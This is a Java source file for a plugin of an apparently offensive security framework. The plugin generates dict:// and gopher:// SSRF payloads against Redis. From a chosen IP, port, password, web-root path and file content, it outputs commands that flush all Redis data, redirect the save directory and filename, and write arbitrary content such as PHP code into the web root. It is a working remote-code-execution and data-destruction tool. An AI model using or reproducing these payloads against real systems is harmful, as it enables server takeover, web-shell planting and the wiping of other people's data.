package me.gv7.woodpecker.plugin.helper;

import me.gv7.woodpecker.plugin.*;

import java.io.File;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Objects;

public class Dict implements IHelper {

    @Override
    public String getHelperTabCaption() {
        return "Dict";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        List<IArg> args = new ArrayList<>();

        // redis对应的ip
        final IArg ip = HelperPlugin.pluginHelper.createArg();
        ip.setName("ip");
        ip.setDefaultValue("127.0.0.1");
        ip.setDescription("redis对应的ip");
        ip.setRequired(true);
        ip.setType(0);
        args.add(ip);

        // redis对应的端口
        final IArg port = HelperPlugin.pluginHelper.createArg();
        port.setName("port");
        port.setDefaultValue("6379");
        port.setDescription("redis对应的端口");
        port.setRequired(true);
        port.setType(0);
        args.add(port);

        // 需要写入的目录
        final IArg path = HelperPlugin.pluginHelper.createArg();
        path.setName("path");
        path.setDefaultValue("/var/www/html/123.php");
        path.setDescription("redis写入的文件路径");
        path.setRequired(true);
        path.setType(0);
        args.add(path);

        // 需要写入的文件内容
        final IArg content = HelperPlugin.pluginHelper.createArg();
        content.setName("content");
        content.setDefaultValue("<?php phpinfo();?>");
        content.setDescription("redis写入的文件内容");
        content.setRequired(true);
        content.setType(0);
        args.add(content);

        // redis对应的密码
        final IArg auth = HelperPlugin.pluginHelper.createArg();
        auth.setName("auth");
        auth.setDefaultValue("");
        auth.setDescription("认证密码");
        auth.setRequired(true);
        auth.setType(0);
        args.add(auth);

        IArgsUsageBinder argsUsageBinder = HelperPlugin.pluginHelper.createArgsUsageBinder();
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String ip = (String) map.get("ip");
        String port = (String) map.get("port");
        String path = (String) map.get("path");
        String content = (String) map.get("content");
        String auth = (String) map.get("auth");
        String fileName = new File(path).getName();
        String filePath = new File(path).getParent().replaceAll("\\\\","/");
        String redisPayload = Utils.hexToString(content);
        String dictPayload = "dict://"+ip+":"+port+"/";
        if (Objects.equals(auth, "")){
            List<String> list = new ArrayList<>();
            list.add(dictPayload+"flushall");
            list.add(dictPayload+"config:set:dir:"+filePath);
            list.add(dictPayload+"set:rediskkey:\""+redisPayload+"\"");
            list.add(dictPayload+"config:set:dbfilename:"+fileName);
            list.add(dictPayload+"save");
            list.add(dictPayload+"quit");
            iResultOutput.warningPrintln("flushall会清空redis中的所有数据，请谨慎使用！");
            iResultOutput.warningPrintln("web端ssrf需要url编码两次才可以打进去");
            for (String s : list) {
                iResultOutput.rawPrintln(s);
            }
            List<String> gopher = new ArrayList<>();
            gopher.add("flushall\n");
            gopher.add("config set dbfilename "+fileName+"\n");
            gopher.add("config set dir "+filePath+"\n");
            gopher.add("set rediskkey \""+content.replace("'", "~~~").replace("\"", "~~~~").replace("\r", "")+"\""+"\n");
            gopher.add("save\n");
            gopher.add("quit\n");
            String encoded = GopherCodec.encode4gopher(gopher,ip,port);
            if (encoded.contains("%7E%7E%7E%7E")){
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E%7E","%22"));
            }else if (encoded.contains("%7E%7E%7E")) {
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E", "%27"));
            }else {
                iResultOutput.rawPrintln(encoded);
            }
        }else {
            List<String> list = new ArrayList<>();
            list.add(dictPayload+"auth:"+auth);
            list.add(dictPayload+"flushall");
            list.add(dictPayload+"config:set:dir:"+filePath);
            list.add(dictPayload+"set:rediskkey:\""+redisPayload+"\"");
            list.add(dictPayload+"config:set:dbfilename:"+fileName);
            list.add(dictPayload+"save");
            list.add(dictPayload+"quit");
            iResultOutput.warningPrintln("flushall会清空redis中的所有数据，请谨慎使用！");
            iResultOutput.warningPrintln("web端ssrf需要url编码两次才可以打进去");
            for (String s : list) {
                iResultOutput.rawPrintln(s);
            }
            List<String> gopher = new ArrayList<>();
            gopher.add("auth "+auth+"\n");
            gopher.add("flushall\n");
            gopher.add("config set dbfilename "+fileName+"\n");
            gopher.add("config set dir "+filePath+"\n");
            gopher.add("set rediskkey \""+content.replace("'", "~~~").replace("\"", "~~~~").replace("\r", "")+"\""+"\n");
            gopher.add("save\n");
            gopher.add("quit\n");
            String encoded = GopherCodec.encode4gopher(gopher,ip,port);
            if (encoded.contains("%7E%7E%7E%7E")){
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E%7E","%22"));
            }else if (encoded.contains("%7E%7E%7E")) {
                iResultOutput.rawPrintln(encoded.replace("%7E%7E%7E", "%27"));
            }else {
                iResultOutput.rawPrintln(encoded);
            }
        }

    }



}
